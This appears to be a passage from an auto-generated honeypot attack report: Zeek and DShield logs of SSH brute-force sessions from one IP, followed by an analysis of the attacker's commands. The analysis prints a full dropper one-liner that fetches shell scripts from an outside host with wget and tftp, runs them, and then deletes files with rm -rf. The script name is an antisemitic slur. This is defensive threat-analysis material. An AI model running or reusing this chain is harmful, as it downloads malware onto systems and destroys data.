#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
1704667417.494442	CXI3Y8tysfuENq3P	138.197.148.152	38208	172.31.5.68	2222	tcp	-	0.069315	0	0	RSTO	F	T	0	ShR	2	80	1	44	-
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2024-01-10-01-38-58
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
1704852012.377446	CO6fnE1L05YWGzYiYa	138.197.148.152	57032	172.31.5.68	2222	tcp	-	0.070982	0	0	RSTO	F	T	0	ShR	2	80	1	44	-
1704852097.709069	Clg6iKbTVFPTrnbOk	138.197.148.152	45526	172.31.5.68	2222	tcp	-	0.136353	0	39	SF	F	T	0	ShAdFf	5	268	3	203	-
1704852097.811083	CLUbPRu9wS77uIgn4	138.197.148.152	45816	172.31.5.68	2222	tcp	-	0.140821	0	39	SF	F	T	0	ShAdFf	5	268	3	203	-
1704852104.543866	CEC5xfsDDfblPzL5g	138.197.148.152	53250	172.31.5.68	2222	tcp	ssh	1.587144	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852104.822802	CUhfmu0HXscUtevH7	138.197.148.152	58904	172.31.5.68	2222	tcp	ssh	1.602050	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852104.915903	C1WXCB2Gj0qgPAXp1d	138.197.148.152	60536	172.31.5.68	2222	tcp	ssh	1.605495	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852104.962987	CHtXAz4EqXNkzVJlik	138.197.148.152	33280	172.31.5.68	2222	tcp	ssh	1.602580	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852105.103620	ClsFLm3pAJdAWRgPc	138.197.148.152	35600	172.31.5.68	2222	tcp	ssh	1.651838	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852105.146009	Cr2ym03P9Y1oPAc5nj	138.197.148.152	36160	172.31.5.68	2222	tcp	ssh	1.636477	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852105.230314	CWkOyj4QlB6W0YNxUj	138.197.148.152	37594	172.31.5.68	2222	tcp	ssh	1.634697	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852105.339678	C2jztC4piLggJ9PWl5	138.197.148.152	39134	172.31.5.68	2222	tcp	ssh	1.541078	1179	1695	SF	F	T	0	ShAdDaFf	14	1915	14	2431	-
1704852107.684991	C1PNGGmrNMP3vfd8	138.197.148.152	43316	172.31.5.68	2222	tcp	ssh	1.599265	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852107.777836	CLuy2lqdiXkAE2euf	138.197.148.152	44350	172.31.5.68	2222	tcp	ssh	1.603934	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852108.291960	CB1A1c7FWBJ1O71Hl	138.197.148.152	49780	172.31.5.68	2222	tcp	ssh	1.582209	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852108.363344	CKwrBa30Of5jYDlXv8	138.197.148.152	50512	172.31.5.68	2222	tcp	ssh	1.592796	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852108.421999	CG9RCz1QQp3NPCOU8j	138.197.148.152	51110	172.31.5.68	2222	tcp	ssh	1.568430	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852108.496870	C9T9Fi3LCcOfrtV7Pi	138.197.148.152	51830	172.31.5.68	2222	tcp	ssh	1.585225	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852108.733720	CfmVLT1lFmOMgfspBf	138.197.148.152	53926	172.31.5.68	2222	tcp	ssh	1.575328	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852108.905717	CUypVtQ1ZYtF3A9K	138.197.148.152	55612	172.31.5.68	2222	tcp	ssh	1.585024	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852112.431926	Cwxcd11AsESHIahOTj	138.197.148.152	59256	172.31.5.68	2222	tcp	ssh	1.590165	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852112.575581	C2zGmI2DM675Onp2ac	138.197.148.152	60350	172.31.5.68	2222	tcp	ssh	1.574443	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852113.264755	Cgdi0n2tIQcgm0bY6a	138.197.148.152	37694	172.31.5.68	2222	tcp	ssh	1.601322	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852113.383468	CImkmB4e5IV63mGFjb	138.197.148.152	38600	172.31.5.68	2222	tcp	ssh	1.575522	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-
1704852113.367212	CFKVuFHD8KRixQIQ5	138.197.148.152	38444	172.31.5.68	2222	tcp	ssh	1.607741	1179	1695	SF	F	T	0	ShADadFf	14	1915	13	2379	-

````

</details>

---


<details>
<summary>
<h3>Zeek ssh.log Logs</h3>
</summary>

Here is a sample of the first `50` lines:

````log
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	ssh
#open	2024-01-10-01-38-59
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	version	auth_success	auth_attempts	direction	client	server	cipher_alg	mac_alg	compression_alg	kex_alg	host_key_alg	host_key
#types	time	string	addr	port	addr	port	count	bool	count	enum	string	string	string	string	string	string	string	string
1704852104.613303	CEC5xfsDDfblPzL5g	138.197.148.152	53250	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852104.897347	CUhfmu0HXscUtevH7	138.197.148.152	58904	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852104.987142	C1WXCB2Gj0qgPAXp1d	138.197.148.152	60536	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852105.034388	CHtXAz4EqXNkzVJlik	138.197.148.152	33280	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852105.181986	ClsFLm3pAJdAWRgPc	138.197.148.152	35600	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852105.225389	Cr2ym03P9Y1oPAc5nj	138.197.148.152	36160	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852105.301853	CWkOyj4QlB6W0YNxUj	138.197.148.152	37594	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852105.410649	C2jztC4piLggJ9PWl5	138.197.148.152	39134	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852107.756304	C1PNGGmrNMP3vfd8	138.197.148.152	43316	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852107.850710	CLuy2lqdiXkAE2euf	138.197.148.152	44350	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852108.360688	CB1A1c7FWBJ1O71Hl	138.197.148.152	49780	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852108.432423	CKwrBa30Of5jYDlXv8	138.197.148.152	50512	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852108.488663	CG9RCz1QQp3NPCOU8j	138.197.148.152	51110	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852108.565602	C9T9Fi3LCcOfrtV7Pi	138.197.148.152	51830	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852108.806329	CfmVLT1lFmOMgfspBf	138.197.148.152	53926	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852108.974784	CUypVtQ1ZYtF3A9K	138.197.148.152	55612	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852112.501661	Cwxcd11AsESHIahOTj	138.197.148.152	59256	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852112.642457	C2zGmI2DM675Onp2ac	138.197.148.152	60350	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852113.336716	Cgdi0n2tIQcgm0bY6a	138.197.148.152	37694	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852113.449806	CImkmB4e5IV63mGFjb	138.197.148.152	38600	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852113.438449	CFKVuFHD8KRixQIQ5	138.197.148.152	38444	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852113.551024	CxQ8aWFKJuaRnStP8	138.197.148.152	39256	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852113.962045	Cpfeut19Bf5DBHI0il	138.197.148.152	42212	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852114.057677	CNDZ7H1XeyaOh2JtKd	138.197.148.152	42916	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852118.998271	CxX3Cp1u8z8Zr0kHB3	138.197.148.152	47322	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852119.055253	CEOhqb2PcNjFKLr5t5	138.197.148.152	47706	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852120.079910	C8OGYo4O4pN5Yw6mz3	138.197.148.152	53958	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852120.150985	CdGfMI37WnjKCTQNYj	138.197.148.152	54380	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852120.188849	CtW3U41yBFUyhwVLmb	138.197.148.152	54626	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852120.267999	C1tLWb2BhEVVgEWmqf	138.197.148.152	55054	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852120.817967	CM30Zx2512HSjinTCd	138.197.148.152	58292	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852120.888672	CYd0ej47kcnKoyhiE7	138.197.148.152	58742	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852126.981019	CmGer13drYsXLemivg	138.197.148.152	35088	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852127.039858	CyYJVe6R4gbRExn88	138.197.148.152	35446	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.032863	C8n7Lt2XB5mp51PmJ9	138.197.148.152	46590	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.031154	CsnmlnMbvRHeAWAgc	138.197.148.152	42370	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.031674	CTQbO72fP3EHwmm9D1	138.197.148.152	42848	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.032283	CxXpkh1bzR67dWx6P9	138.197.148.152	45984	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.016289	CMZbkD4UM0cYqKIzeg	138.197.148.152	41690	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.030633	CtLYbF4PrhEHcIVjy8	138.197.148.152	42122	172.31.5.68	2222	2	T	1	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.035473	CIBH88VbZ1EWeW9p9	138.197.148.152	58306	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a
1704852188.043965	CsFVsM3osRKKbTTRR7	138.197.148.152	50296	172.31.5.68	2222	2	-	0	INBOUND	SSH-2.0-libssh2_1.4.3	SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2	aes128-ctr	hmac-sha1	none	diffie-hellman-group14-sha1	ssh-rsa	21:37:4e:b8:89:09:59:06:8f:ca:09:cf:e8:a3:c1:4a

````

</details>

---


## DShield Logs
Total DShield logs: `2`

#### The `250` sessions in this attack were logged as connection in the following DShield firewall logs:
Here is a sample of the first `50` lines:

````log
1704559287 BigDshield kernel:[10972.923460]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=138.197.148.152 DST=172.31.5.68 LEN=40 TOS=0x00 PREC=0x00 TTL=235 ID=54321 PROTO=TCP SPT=45139 DPT=2222 WINDOW=65535 RES=0x00 SYN URGP=0 
1704667417 BigDshield kernel:[32704.115027]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=138.197.148.152 DST=172.31.5.68 LEN=40 TOS=0x00 PREC=0x00 TTL=235 ID=54321 PROTO=TCP SPT=38208 DPT=2222 WINDOW=65535 RES=0x00 SYN URGP=0 

````

</details>

---


<details>
<summary>
<h1>IP and Ports</h1>
</summary>

The IP address and ports involved in the attack are as follows:

- Attacker's IP Address: `138.197.148.152`
- Attacker's Source Ports: `45526`, `45816`, `53250`, `58904`, `60536`, `33280`, `35600`, `36160`, `37594`, `39134`, `43316`, `44350`, `49780`, `50512`, `51110`, `51830`, `53926`, `55612`, `59256`, `60350`, `37694`, `38444`, `38600`, `39256`, `42212`, `42916`, `47322`, `47706`, `53958`, `54380`, `54626`, `55054`, `58292`, `58742`, `35088`, `35446`, `41690`, `42122`, `42370`, `42848`, `45984`, `46590`, `51036`, `51522`, `57652`, `58216`, `58306`, `58910`, `33846`, `34278`, `38910`, `39162`, `45478`, `45880`, `46188`, `46576`, `49840`, `50296`, `54682`, `55448`, `33116`, `33818`, `33850`, `34560`, `37472`, `38230`, `42460`, `43258`, `49084`, `49760`, `49910`, `50598`, `53388`, `54328`, `58422`, `59236`, `36804`, `37516`, `37644`, `38336`, `41202`, `42002`, `46102`, `47060`, `52692`, `53370`, `53758`, `54430`, `57066`, `58032`, `33740`, `34854`, `40406`, `41102`, `41476`, `42176`, `44760`, `45858`, `49686`, `50884`, `56206`, `56902`, `57594`, `58294`, `60596`, `33744`, `37164`, `38838`, `43732`, `44398`, `45562`, `46236`, `48086`, `49942`, `52892`, `55018`, `59552`, `60240`, `33480`, `34184`, `37898`, `41642`, `41766`, `47932`, `48638`, `48806`, `49622`, `52188`, `53330`, `56400`, `58884`, `34988`, `35674`, `37092`, `37836`, `39376`, `41586`, `45018`, `45794`, `51674`, `52354`, `52434`, `53176`, `56024`, `56772`, `32964`, `33288`, `39662`, `39860`, `40346`, `40556`, `44124`, `44136`, `48832`, `49358`, `55400`, `56060`, `56142`, `56770`, `59734`, `60458`, `36278`, `37326`, `42976`, `43686`, `43922`, `44616`, `47352`, `48318`, `52316`, `53266`, `58888`, `59568`, `59966`, `60642`, `35016`, `36094`, `39624`, `41502`, `46258`, `46920`, `48148`, `48838`, `52468`, `55522`, `57538`, `33888`, `34552`, `35952`, `36652`, `38262`, `40330`, `43026`, `45510`, `49684`, `50372`, `52140`, `52828`, `53982`, `56578`, `59066`, `33204`, `37476`, `38162`, `39846`, `40550`, `41782`, `44258`, `46724`, `49300`, `53940`, `56002`, `56694`, `57548`, `60346`, `34130`, `37310`, `40718`, `41396`, `44134`, `44854`, `44936`, `48558`, `49674`, `53722`, `56290`, `56980`, `60424`, `60628`, `32872`, `36472`, `37304`, `41790`, `43820`, `44514`, `48204`, `48424`, `49114`, `52768`, `53084`, `57860`, `59696`, `60376`, `35818`, `36272`, `36942`, `40656`
- Honeypot's IP Address: `172.31.5.68`
- Honeypot's Destination Port: `2222`

(Note: Only a subset of source ports has been provided due to the large number of different ports used in the attack.)

<details>
<summary>
<h3>Top 1 Source Ips</h3>
</summary>

Total Source IPs: `250`
Unique: `1`

| Source IP | Times Seen |
| --- | --- |
| `138.197.148.152` | `250` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ips</h3>
</summary>

Total Destination IPs: `250`
Unique: `1`

| Destination IP | Times Seen |
| --- | --- |
| `172.31.5.68` | `250` |

</details>

---


<details>
<summary>
<h3>Top 10 Source Ports</h3>
</summary>

Total Source Ports: `250`
Unique: `247`

| Source Port | Times Seen |
| --- | --- |
| `35600` | `2` |
| `50598` | `2` |
| `53266` | `2` |
| `45526` | `1` |
| `45816` | `1` |
| `53250` | `1` |
| `58904` | `1` |
| `60536` | `1` |
| `33280` | `1` |
| `36160` | `1` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ports</h3>
</summary>

Total Destination Ports: `250`
Unique: `1`

| Destination Port | Times Seen |
| --- | --- |
| `2222` | `250` |

</details>

---


</details>

---


# Commands Used
This attack used a total of `8` inputs to execute the following `88` commands:
The commands used in the attack can be broken down into a series of steps that are commonly associated with post-exploitation activities in a compromised system. Here's the breakdown of the commands and their functions:

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
```
- Tries to change the directory to one of the listed directories, where `/tmp` and `/var/run` are commonly writable by all users, `/mnt` is for mount points, and `/root` is the home directory for the root user. If all directories fail, it defaults to the root directory `/`. 

```bash
wget http://213.255.246.81/fuckjewishpeople.sh;
```
- Downloads a file named `fuckjewishpeople.sh` from the specified IP address. `wget` is a network downloader that retrieves files from web servers.

```bash
chmod 777 fuckjewishpeople.sh;
```
- Changes the file permissions of `fuckjewishpeople.sh` to be fully writable, readable, and executable by any user on the system (`777` is the mode that allows all actions for all users).

```bash
sh fuckjewishpeople.sh;
```
- Executes the shell script `fuckjewishpeople.sh`, which may contain any manner of malicious commands such as further malware download, configuration changes, or setting up a backdoor.

```bash
tftp 213.255.246.81 -c get tftp1.sh;
```
- Uses the Trivial File Transfer Protocol (TFTP) to download a file named `tftp1.sh` from the specified IP address. TFTP is a simple file transfer protocol often used when FTP is not available.

```bash
chmod 777 tftp1.sh; sh tftp1.sh;
```
- Similar to the previous `chmod` and `sh` commands, this sets the permissions of the new script (`tftp1.sh`) and executes it.

```bash
tftp -r tftp2.sh -g 213.255.246.81;
```
- Another TFTP command that retrieves a file named `tftp2.sh` from the same IP address. This time the syntax specifies the remote file and gets the action explicitly.

```bash
chmod 777 tftp2.sh; sh tftp2.sh;
```
- Again changes permissions to be fully accessible and executes the `tftp2.sh` script.

```bash
rm -rf *;
```
- Deletes all files in the current working directory. The `-r` option is recursive (delete directories and their contents), and `-f` is "force" (ignore nonexistent files and never prompt). This could be used to cover tracks, delete important files, cause disruption, or it could be the destructive payload of one of the scripts.

### Context of the Attack
These commands, taken together, show a clear intent to manipulate a compromised system in several harmful ways:

1. Persistence - Downloading and executing scripts could create backdoors, install rootkits, or set up other methods to retain access.
2. Lateral movement - Scripts may attempt to spread laterally to other systems in the network or connect to command and control (C&C) servers for further instructions.
3. Destructiveness - The final command suggests a willingness to destroy data, possibly indicating a ransomware-like element, a punitive action, or a smokescreen to hide other activities.

The use of multiple fallback directories and multiple methods of downloading files (wget and tftp) demonstrates redundancy in the attack plan, ensuring that if one step fails, the next could succeed. It is important to note that the specific effects of the scripts can only be fully understood by analyzing the contents of these scripts.

<details>
<summary>
<h2>Raw Command Inputs</h2>
</summary>

The attacker entered the following `8` inputs on the honeypot system:

**Input 1:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 2:**
````bash
